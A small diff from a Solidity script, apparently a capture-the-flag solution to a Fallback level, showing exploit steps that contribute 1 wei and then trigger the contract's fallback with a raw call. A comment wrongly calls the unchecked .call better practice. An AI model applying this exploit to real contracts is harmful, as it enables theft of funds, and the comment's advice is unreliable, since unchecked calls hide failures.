@@ -18,7 +18,7 @@ contract FallbackHack is Script {
         fallbackWTF.contribute{value: 1 wei}();
         
         // SECOND STEP: //
-        address(fallbackWTF).call{value: 1 wei}(""); 
+        address(fallbackWTF).call{value: 1 wei}("");  
         // This is better practice to use .call, because it will not show the error fails or passes:
         /*  (bool success, ) = address(fallbackWTF).call{value: 1 wei}("");
         require(success, "Failed to send ether"); */
